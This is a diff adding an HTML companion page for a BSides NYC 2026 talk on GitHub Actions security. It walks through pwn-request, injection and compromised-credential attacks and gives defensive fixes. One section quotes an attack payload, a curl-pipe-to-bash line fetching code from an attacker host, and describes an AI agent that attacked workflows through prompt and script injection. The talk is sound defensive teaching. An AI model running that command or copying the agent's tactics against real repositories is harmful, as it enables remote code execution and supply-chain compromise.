@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Talk companion for Rethinking CI/CD Security in the Age of GitHub Actions — BSides NYC 2026, Kennedy Toomey and Max Saltonstall.">
+  <link rel="stylesheet" href="styles.css">
+  <title>Rethinking CI/CD Security in the Age of GitHub Actions | BSides NYC 2026</title>
+  <script>
+  (function(h,o,u,n,d) {
+    h=h[d]=h[d]||{q:[],onReady:function(c){h.q.push(c)}}
+    d=o.createElement(u);d.async=1;d.src=n;d.crossOrigin=''
+    n=o.getElementsByTagName(u)[0];n.parentNode.insertBefore(d,n)
+  })(window,document,'script','https://www.datadoghq-browser-agent.com/us1/v7/datadog-rum.js','DD_RUM')
+  window.DD_RUM.onReady(function() {
+    window.DD_RUM.init({
+        applicationId: '0a00e409-0298-4665-b744-8f1c05b2e945',
+        clientToken: 'pub3dd060336ba6b7167f84a600967620a1',
+        remoteConfiguration: {
+            id: 'fb396860-9668-4154-9e7e-cfcf68bfd3e1',
+        },
+        site: 'datadoghq.com',
+        service: 'bsidesnyc-2026',
+        env: 'prod',				// e.g. 'prod', 'staging-1', 'dev'
+        version: '1',	// e.g. '1.0.0'
+        sessionSampleRate: 100,			// capture 100% of sessions
+        sessionReplaySampleRate: 20,	// capture 20% of sessions with replay
+        trackResources: true,			// Enable Resource tracking
+        trackUserInteractions: true,	// Enable Action tracking
+        trackLongTasks: true,			// Enable Long Tasks tracking
+    
+        // ----- Recommended Options -----
+        // allowedTracingUrls: '<BACKEND_URL>',		// Enable distributed tracing
+        // defaultPrivacyLevel: 'mask-user-input',	// 'mask-user-input' | 'allow' | 'mask'
+    });
+  })
+</script>
+</head>
+<body>
+
+<header>
+  <a class="conference-tag" href="https://bsidesnyc.org" target="_blank" rel="noopener">BSides NYC · October 2026</a>
+</header>
+
+<!-- HERO -->
+<div class="hero-wrap">
+<section class="hero">
+  <p class="hero-eyebrow">Talk · CI/CD Security</p>
+  <h1>Rethinking CI/CD Security<br>in the Age of <span>GitHub Actions</span></h1>
+  <p class="hero-sub">
+    Mutable tags, pwn requests, and poisoned security scanners. How three real attacks
+    turned GitHub workflows into a breach path, and the three fixes that close it
+    without leaving GitHub.
+  </p>
+  <div class="hero-actions">
+    <a href="rethinking-cicd-security-github-actions.pdf" class="btn btn-primary" target="_blank" rel="noopener">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm4 18H6V4h7v5h5v11z"/></svg>
+      View Slides
+    </a>
+    <a href="#overview" class="btn btn-outline">Talk Highlights</a>
+    <a href="#takeaways" class="btn btn-outline">Jump to Takeaways</a>
+  </div>
+</section>
+</div>
+
+<!-- SPEAKER BAR -->
+<div class="speaker-bar">
+  <div class="speaker-bar-inner">
+    <img src="dd_icon_white.png" alt="Datadog" style="height:32px; display:block;">
+    <div class="speakers">
+      <div class="speaker">
+        <div class="speaker-info">
+          <strong>Kennedy Toomey</strong>
+          <span>Application Security Researcher &amp; Advocate @ Datadog</span>
+        </div>
+        <div class="speaker-links inline">
+          <a class="speaker-linkedin" href="https://www.linkedin.com/in/kennedy-toomey" target="_blank" rel="noopener">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M19 0h-14c-2.76 0-5 2.24-5 5v14c0 2.76 2.24 5 5 5h14c2.76 0 5-2.24 5-5v-14c0-2.76-2.24-5-5-5zm-11 19h-3v-10h3v10zm-1.5-11.27c-.97 0-1.75-.79-1.75-1.76s.78-1.75 1.75-1.75 1.75.78 1.75 1.75-.78 1.76-1.75 1.76zm13.5 11.27h-3v-5.6c0-1.34-.03-3.07-1.87-3.07-1.87 0-2.16 1.46-2.16 2.97v5.7h-3v-10h2.88v1.36h.04c.4-.76 1.38-1.56 2.84-1.56 3.04 0 3.6 2 3.6 4.59v5.61z"/></svg>
+            LinkedIn
+          </a>
+          <a class="speaker-linkedin" href="https://kennedytoomey.github.io/" target="_blank" rel="noopener">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+            Website
+          </a>
+        </div>
+      </div>
+      <div class="speaker">
+        <div class="speaker-info">
+          <strong>Max Saltonstall</strong>
+          <span>Technical Storytelling Advocate @ Datadog</span>
+        </div>
+        <!-- TODO: replace the "#" hrefs with Max's LinkedIn and website URLs -->
+        <div class="speaker-links inline">
+          <a class="speaker-linkedin" href="https://www.linkedin.com/in/maxsaltonstall/" target="_blank" rel="noopener">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M19 0h-14c-2.76 0-5 2.24-5 5v14c0 2.76 2.24 5 5 5h14c2.76 0 5-2.24 5-5v-14c0-2.76-2.24-5-5-5zm-11 19h-3v-10h3v10zm-1.5-11.27c-.97 0-1.75-.79-1.75-1.76s.78-1.75 1.75-1.75 1.75.78 1.75 1.75-.78 1.76-1.75 1.76zm13.5 11.27h-3v-5.6c0-1.34-.03-3.07-1.87-3.07-1.87 0-2.16 1.46-2.16 2.97v5.7h-3v-10h2.88v1.36h.04c.4-.76 1.38-1.56 2.84-1.56 3.04 0 3.6 2 3.6 4.59v5.61z"/></svg>
+            LinkedIn
+          </a>
+          <a class="speaker-linkedin" href="https://sites.google.com/view/max-saltonstall-content/home" target="_blank" rel="noopener">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+            Website
+          </a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- MAIN -->
+<main id="overview">
+
+  <p class="section-label">Talk Overview</p>
+  <h2 class="section-title">From Mutable Tag to Breach</h2>
+  <p class="section-desc">
+    GitHub Actions runs third-party code next to your secrets. This walkthrough follows the talk:
+    how that trust gets abused, three attacks that abused it, and what to change on Monday.
+  </p>
+
+  <div class="track">
+
+    <!-- 01 -->
+    <div class="track-item featured">
+      <div class="track-item-inner">
+        <div class="track-number">01 · The Problem</div>
+        <div class="track-kicker">GitHub Actions makes you vulnerable</div>
+        <h3 class="track-heading">Breaking Down the Terminology</h3>
+        <div class="track-body">
+          <div class="cards">
+            <div class="card">
+              <div class="card-label">Platform</div>
+              <div class="card-title">GitHub Actions</div>
+              Build, test, and deploy your code right from your GitHub repository.
+            </div>
+            <div class="card c-input">
+              <div class="card-label">Pipeline</div>
+              <div class="card-title">Workflow</div>
+              YAML-defined pipeline automation.
+            </div>
+            <div class="card c-good">
+              <div class="card-label">Component</div>
+              <div class="card-title">Action</div>
+              Pre-defined, reusable jobs or code.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 02 -->
+    <div class="track-item">
+      <div class="track-item-inner">
+        <div class="track-number">02 · Action Versioning</div>
+        <div class="track-kicker">A tag is a pointer, not a version</div>
+        <h3 class="track-heading">Why <code>@v2</code> Isn't a Version</h3>
+        <div class="track-body">
+          <ul>
+            <li><strong>Tags move.</strong> Anyone with write access to the action's repo can point the tag at new code. Your workflow follows it silently.</li>
+            <li><strong>You can't answer "what ran?"</strong> No pinned hash means no record of the code that touched your secrets last Tuesday.</li>
+            <li><strong>Updates arrive without review.</strong> A maintainer change, a compromised account, a new transitive dependency, all shipped straight into your runner.</li>
+          </ul>
+<pre><code><span class="cm"># the less secure way: pinning to a tag</span>
+<span class="k">uses</span>: <span class="s">tholander/actions-comment-pull-request</span><span class="v">@v2</span>
+
+<span class="cm"># the more secure way: pinning to a commit SHA</span>
+<span class="k">uses</span>: <span class="s">tholander/actions-comment-pull-request</span><span class="v">@b07c7f86be67002023e6cb13f57df3f21cdd3411</span></code></pre>
+          <div class="bar-figure">
+            <div class="bar-title">Most organizations are vulnerable to malicious GitHub Actions</div>
+            <div class="bar" role="img" aria-label="Organizations pinning marketplace actions to a release SHA: 4% pin all actions, 25% pin some, 71% pin none.">
+              <div class="all" style="flex: 4;">4%</div>
+              <div class="some" style="flex: 25;">25%</div>
+              <div class="none" style="flex: 71;">71%</div>
+            </div>
+            <div class="bar-legend">
+              <span style="--sw:#38bdf8">Pin all marketplace actions to a SHA</span>
+              <span style="--sw:#2563eb">Pin some</span>
+              <span style="--sw:#1e3a8a">Pin none</span>
+            </div>
+            <div class="bar-source">Source: <a href="https://www.datadoghq.com/state-of-devsecops/#4" target="_blank" rel="noopener">Datadog State of DevSecOps</a></div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://www.datadoghq.com/state-of-devsecops/#4" target="_blank" rel="noopener">Datadog: State of DevSecOps</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 03 -->
+    <div class="track-item">
+      <div class="track-item-inner">
+        <div class="track-number">03 · Attack Patterns</div>
+        <div class="track-kicker">No silver bullet</div>
+        <h3 class="track-heading">Common Workflow Attacks</h3>
+        <div class="track-body">
+          <p>Risk comes from two places: the <strong>code you call on</strong> (third-party actions) and the <strong>code you wrote</strong> (your own workflows). Each needs its own fix.</p>
+          <div class="cards">
+            <div class="card c-pwn">
+              <div class="card-title">Pwn requests</div>
+              <p>A workflow triggered by <code>pull_request_target</code> checks out the fork's code but runs with the base repo's secrets and write token.</p>
+              <div class="card-foot"><strong>Seen in the wild:</strong> s1ngularity</div>
+            </div>
+            <div class="card c-input">
+              <div class="card-title">Injections</div>
+              <p>A workflow passes data through shell commands, often unvalidated and open to remote code execution.</p>
+              <div class="card-foot"><strong>Seen in the wild:</strong> hackerbot-claw</div>
+            </div>
+            <div class="card c-creds">
+              <div class="card-title">Compromised credentials</div>
+              <p>A maintainer token or publishing credential is stolen, and the trusted action itself starts shipping malicious releases.</p>
+              <div class="card-foot"><strong>Seen in the wild:</strong> Trivy, KICS</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 04 -->
+    <div class="track-item c-pwn">
+      <div class="track-item-inner">
+        <div class="track-number">04 · Case Study · <span>Pwn Request</span></div>
+        <div class="track-kicker">August 2025</div>
+        <h3 class="track-heading">s1ngularity: A PR Title That Published npm Packages</h3>
+        <div class="track-body">
+          <div class="flow">
+            <div class="card">
+              <div class="card-label">01</div>
+              A PR with a malicious title was opened in the Nx repo.
+            </div>
+            <div class="card">
+              <div class="card-label">02</div>
+              Nx's PR-title validation workflow ran on <code>pull_request_target</code> and returned a <code>GITHUB_TOKEN</code>.
+            </div>
+            <div class="card">
+              <div class="card-label">03</div>
+              Malicious Nx versions shipped a postinstall script.
+            </div>
+            <div class="card">
+              <div class="card-label">04</div>
+              With additional creds, attackers made private repos public and exfiltrated secrets.
+            </div>
+          </div>
+          <div class="stats">
+            <div class="stat"><strong>2,180</strong>accounts exposed</div>
+            <div class="stat"><strong>7,200</strong>repositories exposed</div>
+          </div>
+          <div class="cards two">
+            <div class="card">
+              <div class="card-label">Lesson</div>
+              The vulnerable workflow was reverted on main almost immediately. The attacker opened the PR against an outdated branch instead. <strong>Fixing forward isn't enough.</strong>
+            </div>
+            <div class="card">
+              <div class="card-label">Lesson</div>
+              Avoid <code>pull_request_target</code> whenever possible. If you have to use it, <strong>do not execute code from the PR.</strong>
+            </div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://securitylabs.datadoghq.com/articles/learnings-from-recent-npm-compromises/" target="_blank" rel="noopener">Learnings from Recent npm Compromises</a></li>
+              <li><a href="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/" target="_blank" rel="noopener">GitHub Security Lab: Preventing Pwn Requests</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 05 -->
+    <div class="track-item c-input">
+      <div class="track-item-inner">
+        <div class="track-number">05 · Case Study · <span>Injection</span></div>
+        <div class="track-kicker">February 2026</div>
+        <h3 class="track-heading">hackerbot-claw: An AI Agent Hunting Workflows</h3>
+        <div class="track-body">
+          <p>An AI agent built to exploit GitHub Actions and LLM-powered workflows. It claimed to run on Anthropic's Opus 4.5 and targeted open source projects through malicious pull requests, issues, and comments between February 27 and March 2, 2026.</p>
+          <div class="stats">
+            <div class="stat"><strong>16</strong>pull requests opened</div>
+            <div class="stat"><strong>2</strong>issues opened</div>
+            <div class="stat"><strong>8</strong>comments posted on targets</div>
+            <div class="stat"><strong>9</strong>repositories across 6 organizations</div>
+          </div>
+          <p style="margin-top: 1rem;"><strong>Same payload, different injection locations.</strong></p>
+<pre><code>curl -sSfL hackmoltrepeat.com/molt | bash</code></pre>
+          <div class="tags">
+            <span>Branch-name injection</span>
+            <span>Filename injection</span>
+            <span>Direct script injection</span>
+            <span>Prompt injection</span>
+            <span>Pwn request</span>
+          </div>
+
+          <p style="margin-top: 1.25rem;"><strong>When it came for Datadog</strong></p>
+          <div class="flow">
+            <div class="card">
+              <div class="card-label">Step 01</div>
+              <div class="card-title">Malicious PR</div>
+              Targeted <code>datadog-iac-scanner</code>.
+            </div>
+            <div class="card">
+              <div class="card-label">Step 02</div>
+              <div class="card-title">BewAIre analysis</div>
+              Datadog's LLM-powered malicious code review flagged the PR immediately.
+            </div>
+            <div class="card">
+              <div class="card-label">Step 03</div>
+              <div class="card-title">Cloud SIEM signal</div>
+              The finding raised a security signal and alerted the incident response team.
+            </div>
+            <div class="card">
+              <div class="card-label">Step 04</div>
+              <div class="card-title">SIRT investigation</div>
+              18 minutes later, BewAIre caught a second attempt.
+            </div>
+          </div>
+
+          <p style="margin-top: 1.25rem;"><strong>Lessons learned</strong></p>
+          <ol style="padding-left: 1.2rem; margin-top: 0.4rem;">
+            <li>Assume public workflows will be continuously tested.</li>
+            <li>Treat all external content as untrusted.</li>
+            <li>Minimize the access.</li>
+            <li>Pair prevention with detection.</li>
+          </ol>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://www.datadoghq.com/blog/engineering/stopping-hackerbot-claw-with-bewaire/" target="_blank" rel="noopener">Stopping hackerbot-claw with BewAIre</a></li>
+              <li><a href="https://www.datadoghq.com/blog/engineering/scaling-malicious-code-detection/" target="_blank" rel="noopener">Scaling Malicious Code Detection</a> (<a href="https://www.youtube.com/watch?v=lV_c-ioSFs4" target="_blank" rel="noopener">video</a>)</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 06 -->
+    <div class="track-item c-creds">
+      <div class="track-item-inner">
+        <div class="track-number">06 · Case Study · <span>Compromised Credentials</span></div>
+        <div class="track-kicker">March 2026</div>
+        <h3 class="track-heading">Trivy and KICS via TeamPCP</h3>
+        <div class="track-body">
+          <div class="stats">
+            <div class="stat"><strong>75</strong>Trivy tags poisoned (Mar 19)</div>
+            <div class="stat"><strong>2</strong>Checkmarx open source actions compromised (Mar 23)</div>
+          </div>
+          <div class="callout">
+            <strong>The lesson</strong>
+            Pin to hash, not to tag. And avoid <code>pull_request_target</code> whenever possible. Seriously, people.
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know" target="_blank" rel="noopener">Aqua Security: Trivy Supply Chain Attack, What You Need to Know</a></li>
+              <li><a href="https://checkmarx.com/blog/ongoing-security-updates" target="_blank" rel="noopener">Checkmarx: Ongoing Security Updates</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 07 -->
+    <div class="track-item">
+      <div class="track-item-inner">
+        <div class="track-number">07 · So What Now?</div>
+        <div class="track-kicker">Option 1: Denials</div>
+        <h3 class="track-heading">The Denials</h3>
+        <div class="track-body">
+          <div class="cards two">
+            <div class="card"><span class="quote">"We're too small to be a target."</span></div>
+            <div class="card c-creds"><span class="quote">"Our tokens aren't in the workflows anyway."</span></div>
+            <div class="card c-warn"><span class="quote">"Those actions might be dangerous, but our setup is fine."</span></div>
+            <div class="card c-input"><span class="quote">"Can't catch me, I'm the gingerbread man."</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 08 -->
+    <div class="track-item">
+      <div class="track-item-inner">
+        <div class="track-number">08 · So What Now?</div>
+        <div class="track-kicker">Option 2: leave, or never use third-party actions</div>
+        <h3 class="track-heading">The Alternatives</h3>
+        <div class="track-body">
+          <div class="cards">
+            <div class="card">
+              <div class="card-label">01</div>
+              <div class="card-title">Switch CI providers</div>
+            </div>
+            <div class="card c-warn">
+              <div class="card-label">02</div>
+              <div class="card-title">Write everything yourself</div>
+            </div>
+            <div class="card c-good">
+              <div class="card-label">03</div>
+              <div class="card-title">Fork the open source action so you own it</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 09 -->
+    <div class="track-item featured c-good" id="fixes">
+      <div class="track-item-inner">
+        <div class="track-number">09 · The Fix</div>
+        <div class="track-kicker">Three moves. None of them require leaving GitHub.</div>
+        <h3 class="track-heading">Fix Your Triggers, Pin Your Dependencies, Scan the Config</h3>
+        <div class="track-body">
+          <div class="cards">
+            <div class="card c-creds">
+              <div class="card-label">01</div>
+              <div class="card-title">Fix your triggers</div>
+            </div>
+            <div class="card c-input">
+              <div class="card-label">02</div>
+              <div class="card-title">Pin your dependencies</div>
+            </div>
+            <div class="card">
+              <div class="card-label">03</div>
+              <div class="card-title">Scan the config</div>
+            </div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions" target="_blank" rel="noopener">GitHub Docs: Security Hardening for GitHub Actions</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 10 -->
+    <div class="track-item c-good">
+      <div class="track-item-inner">
+        <div class="track-number">10 · The Fix</div>
+        <div class="track-kicker">Pin your dependencies</div>
+        <h3 class="track-heading">Handling Actions Versions</h3>
+        <div class="track-body">
+          <div class="cards two">
+            <div class="card">
+              <div class="card-title">Pin to a full commit SHA</div>
+              <p><strong>Pro:</strong> you choose exactly what version to use.</p>
+              <p><strong>Con:</strong> tedious to keep current (without Dependabot), and it doesn't pin the action's own actions.</p>
+            </div>
+            <div class="card c-input">
+              <div class="card-title">Workflow dependency locking</div>
+              <p><strong>Pro:</strong> a lockfile covering direct <em>and</em> transitive actions.</p>
+              <p><strong>Con:</strong> still in preview.</p>
+            </div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://docs.github.com/en/actions/how-tos/secure-your-work/lock-workflow-dependencies" target="_blank" rel="noopener">GitHub Docs: Lock Workflow Dependencies</a></li>
+              <li><a href="https://github.blog/changelog/2026-10-14-github-actions-workflow-lockfiles-in-public-preview/" target="_blank" rel="noopener">GitHub Changelog: Workflow Lockfiles in Public Preview</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 11 -->
+    <div class="track-item c-good">
+      <div class="track-item-inner">
+        <div class="track-number">11 · The Fix</div>
+        <div class="track-kicker">Scan the config</div>
+        <h3 class="track-heading">Let Tooling Read Every Workflow You Won't</h3>
+        <div class="track-body">
+          <p>IaC and CI/CD security rules (Datadog, Google, Microsoft, and others all ship them) parse your workflow files and flag dangerous patterns as policy violations, right in the pull request.</p>
+          <div class="cards">
+            <div class="card">
+              <div class="card-title">Triggers &amp; permissions</div>
+              Dangerous events, <code>write-all</code> tokens, missing top-level <code>permissions</code>.
+            </div>
+            <div class="card c-input">
+              <div class="card-title">Injection sinks</div>
+              Untrusted context interpolated into <code>run:</code> steps and script arguments.
+            </div>
+            <div class="card c-warn">
+              <div class="card-title">Secrets &amp; runners</div>
+              Secrets exposed to fork jobs, self-hosted runners reachable from public repos.
+            </div>
+            <div class="card c-creds">
+              <div class="card-title">Unpinned references</div>
+              Actions used by tag or branch. The finding that would have covered March.
+            </div>
+          </div>
+          <p style="margin-top: 1.1rem;"><strong>Where this works, and where it doesn't</strong></p>
+          <div class="cards">
+            <div class="card c-good">
+              <div class="card-title">Works well</div>
+              Static, syntactic patterns: an unpinned <code>uses:</code>, a bad trigger, an over-broad token, a raw interpolation in a shell step. High signal, low argument, fixable in one PR.
+            </div>
+            <div class="card c-warn">
+              <div class="card-title">Still lacking</div>
+              Intent. A pinned SHA can still be malicious code you approved by accident, and no rule tells you whether a maintainer should have publish rights. Runtime behavior needs runtime signals.
+            </div>
+            <div class="card c-creds">
+              <div class="card-title">Gotchas</div>
+              Reusable workflows and composite actions hide a second layer of <code>uses:</code>. Docker-based actions pull mutable image tags. And an "immutable release" badge doesn't stop a tag being force-pushed.
+            </div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://docs.datadoghq.com/security/code_security/iac_security/" target="_blank" rel="noopener">Datadog Docs: IaC Security</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 12 -->
+    <div class="track-item">
+      <div class="track-item-inner">
+        <div class="track-number">12 · Platform</div>
+        <div class="track-kicker">Platform changes</div>
+        <h3 class="track-heading">GitHub Is Making Changes</h3>
+        <div class="track-body">
+          <div class="cards">
+            <div class="card">
+              <div class="card-title">Initial compromise</div>
+              <ul>
+                <li><code>actions/checkout</code> prevents checking out untrusted code from forks</li>
+                <li>New policies limit who triggers risky actions and which triggers are permitted</li>
+                <li>Actions cache is read-only for untrusted triggers</li>
+              </ul>
+            </div>
+            <div class="card c-input">
+              <div class="card-title">Exfiltrating credentials</div>
+              <ul>
+                <li>New Actions network firewall (preview) logs all outbound traffic to detect malicious behavior</li>
+              </ul>
+            </div>
+            <div class="card c-warn">
+              <div class="card-title">Propagating the attack</div>
+              <ul>
+                <li>Dependabot has a default dependency cooldown of 3 days</li>
+                <li>Potentially malicious workflows are held for approval</li>
+                <li>Workflow-level dependency locking</li>
+                <li>Immutable releases</li>
+              </ul>
+            </div>
+            <div class="card c-creds">
+              <div class="card-title">Incident response</div>
+              <ul>
+                <li>Self-service credential revocation</li>
+                <li>Expanded credential revocation API support</li>
+              </ul>
+            </div>
+          </div>
+          <div class="track-resources">
+            <strong>Further Reading</strong>
+            <ul>
+              <li><a href="https://github.blog/security/supply-chain-security/disrupting-supply-chain-attacks-on-npm-and-github-actions/" target="_blank" rel="noopener">GitHub Blog: Disrupting Supply Chain Attacks on npm and GitHub Actions</a></li>
+              <li><a href="https://github.blog/changelog/2026-07-28-github-actions-holds-potentially-malicious-workflows-for-approval/" target="_blank" rel="noopener">GitHub Changelog: Potentially Malicious Workflows Held for Approval</a></li>
+              <li><a href="https://docs.github.com/en/actions/creating-actions/creating-a-javascript-action" target="_blank" rel="noopener">GitHub Docs: Creating a JavaScript Action</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 13 -->
+    <div class="track-item featured" id="takeaways">
+      <div class="track-item-inner">
+        <div class="track-number">13 · Takeaways</div>
+        <div class="track-kicker">Three things, in this order</div>
+        <h3 class="track-heading">What to Do on Monday</h3>
+        <div class="track-body">
+          <div class="checklist">
+            <div class="check">
+              <div class="check-box"><svg viewBox="0 0 10 10"><polyline points="1,5 4,8 9,2" stroke="#6d28d9" stroke-width="1.5" fill="none"/></svg></div>
+              <span><strong>Take inventory.</strong> Which actions do you use, and where? Which workflows hold secrets? Which repos still have a dangerous trigger active?</span>
+            </div>
+            <div class="check">
+              <div class="check-box"><svg viewBox="0 0 10 10"><polyline points="1,5 4,8 9,2" stroke="#6d28d9" stroke-width="1.5" fill="none"/></svg></div>
+              <span><strong>Start with easy wins.</strong> Start where the pattern is dangerous but the effort is small. Pin actions, adjust triggers, then widen your scope.</span>
+            </div>
+            <div class="check">
+              <div class="check-box"><svg viewBox="0 0 10 10"><polyline points="1,5 4,8 9,2" stroke="#6d28d9" stroke-width="1.5" fill="none"/></svg></div>
+              <span><strong>Make it repeatable.</strong> Put CI/CD rules in the pull request so the next vulnerability is caught by tooling, not by an attacker.</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- CLOSING -->
+  <div class="closing">
+    <p>A workflow is as dangerous as code.</p>
+    <p>Review it and audit it like code.</p>
+  </div>
+
+  <!-- SLIDES CTA -->
+  <div class="slides-cta" id="slides">
+    <div class="slides-text">
+      <strong>Presentation Slides</strong>
+      <span>Full deck from BSides NYC 2026</span>
+    </div>
+    <a href="rethinking-cicd-security-github-actions.pdf" class="btn btn-primary" target="_blank" rel="noopener">
+      Download PDF
+    </a>
+  </div>
+
+  <!-- LEARN MORE -->
+  <div class="learn-more-section">
+    <div class="learn-more-inner">
+      <img src="dd_icon_white.png" alt="Datadog" style="height:36px; display:block; opacity:0.9;">
+      <div class="learn-more-text">
+        <strong>Want to learn more from other Datadog Security Researchers?</strong>
+        <p>Datadog Security Labs publishes original security research, threat intelligence, and in-depth technical analysis.</p>
+      </div>
+      <a href="https://securitylabs.datadoghq.com/" class="btn btn-primary" target="_blank" rel="noopener">
+        Visit Security Labs →
+      </a>
+    </div>
+  </div>
+
+</main>
+
+<footer>
+  <p>
+    Presented at <a href="https://bsidesnyc.org" target="_blank" rel="noopener">BSides NYC 2026</a>
+    &nbsp;·&nbsp;
+    Kennedy Toomey &amp; Max Saltonstall
+    &nbsp;·&nbsp;
+    <a href="https://www.linkedin.com/in/kennedy-toomey" target="_blank" rel="noopener">LinkedIn</a>
+    &nbsp;·&nbsp;
+    <a href="https://kennedytoomey.github.io/" target="_blank" rel="noopener">Website</a>
+  </p>
+</footer>
+
+</body>
+</html>
